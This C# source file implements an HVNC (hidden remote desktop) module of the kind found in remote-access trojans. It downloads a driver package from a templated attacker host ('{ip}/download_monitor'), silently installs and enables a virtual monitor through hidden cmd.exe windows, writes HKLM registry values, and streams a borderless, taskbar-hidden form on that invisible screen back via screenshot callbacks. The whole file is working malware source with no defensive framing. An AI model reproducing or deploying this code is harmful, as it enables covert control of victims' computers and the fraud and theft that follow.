using System;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;
using System.Net;
using System.Windows.Forms;
using System.Drawing;
using Microsoft.Win32;
using System.Threading.Tasks;


internal class HVNC
{
    private static string monitorDriverPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "MonitorDriver");
    public static async Task StartHVNC(string command)
    {
        // HVNC levy
        try
        {
            Console.WriteLine("We are waiting HVNC.");
            string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string zipFilePath = Path.Combine(monitorDriverPath, "monitor.zip");
            string deviceInstallerPath = Path.Combine(monitorDriverPath, "deviceinstaller64.exe");

            // Creation of driver directions if not satisfied
            if (!Directory.Exists(monitorDriverPath))
            {
                Directory.CreateDirectory(monitorDriverPath);
            }

            // Loading and installing the driver
            if (!File.Exists(deviceInstallerPath))
            {
                using (WebClient webClient = new WebClient())
                {
                    await webClient.DownloadFileTaskAsync(new Uri("{ip}/download_monitor"), zipFilePath);
                    ZipFile.ExtractToDirectory(zipFilePath, monitorDriverPath);
                }
                File.Delete(zipFilePath);
            }

            // Driver installation
            var cmd = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C cd /d \"{monitorDriverPath}\" && deviceinstaller64 install usbmmidd.inf usbmmidd",
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            cmd.Start();
            cmd.WaitForExit();

            // Write in review
            string registryPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF\Services\usbmmIdd\Parameters\Monitors";
            string valueName = "(Default)"; // Default parameter
            string valueData = "1024,768";

            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath, true))
                {
                    if (key == null)
                    {
                        // Create a key if it does not exist
                        using (RegistryKey newKey = Registry.LocalMachine.CreateSubKey(registryPath))
                        {
                            newKey.SetValue(valueName, valueData, RegistryValueKind.String);
                        }
                    }
                    else
                    {
                        key.SetValue(valueName, valueData, RegistryValueKind.String);
                    }
                }
                Console.WriteLine("The value was successfully written to the registry.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error writing to registry: {ex.Message}");
            }

            // Enabling the driver
            cmd = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C cd /d \"{monitorDriverPath}\" && deviceinstaller64 enableidd 1",
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            cmd.Start();
            cmd.WaitForExit();

            // Displaying information about monitors
            foreach (var screen in Screen.AllScreens)
            {
                Console.WriteLine($"Monitor: {screen.DeviceName}, Permission: {screen.Bounds.Width}x{screen.Bounds.Height}");
            }

            // Selecting the last monitor
            Variables.lastScreen = Screen.AllScreens[Screen.AllScreens.Length - 1];
            Console.WriteLine($"Last monitor: {Variables.lastScreen.DeviceName}, Permission: {Variables.lastScreen.Bounds.Width}x{Variables.lastScreen.Bounds.Height}");

            // Create and display a form on the last monitor
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Variables.hvncForm = new Form
            {
                StartPosition = FormStartPosition.Manual,
                FormBorderStyle = FormBorderStyle.None,
                Location = Variables.lastScreen.Bounds.Location,
                Size = new System.Drawing.Size(Variables.lastScreen.Bounds.Width, Variables.lastScreen.Bounds.Height),
                ShowInTaskbar = false
            };

            // Form load event handler to get the form handle
            Variables.hvncForm.Load += async (sender, e) =>
            {
                IntPtr formHandle = Variables.hvncForm.Handle;
                Console.WriteLine($"Descriptor form: {formHandle}");
                // Calling to create a screenshot for broadcasting a form
                await Translations.ScreenshotCallbackAsync();
            };
            Application.Run(Variables.hvncForm);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error starting HVNC: " + ex.Message);
        }
    }

    public static async Task StopHVNC(string command)
    {
        try
        {
            // Closing an HVNC form in the main thread
            Variables.hvncForm.Invoke(new Action(() => Variables.hvncForm.Close()));

            // Waiting for the form to close
            while (Variables.hvncForm.Visible)
            {
                await Task.Delay(100); // Pause 100 milliseconds
            }

            // Running a console command to remove a driver
            Process cmd = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C cd /d \"{monitorDriverPath}\" && deviceinstaller64 remove usbmmidd",
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            cmd.Start();
            cmd.WaitForExit();

            // Displaying a message about the successful completion of the operation to the console
            Console.WriteLine("Driver removed successfully.");
        }
        catch (Exception ex)
        {
            // Print an error message to the console if something goes wrong
            Console.WriteLine("Error when closing the form and uninstalling the driver: " + ex.Message);
        }
    }
}

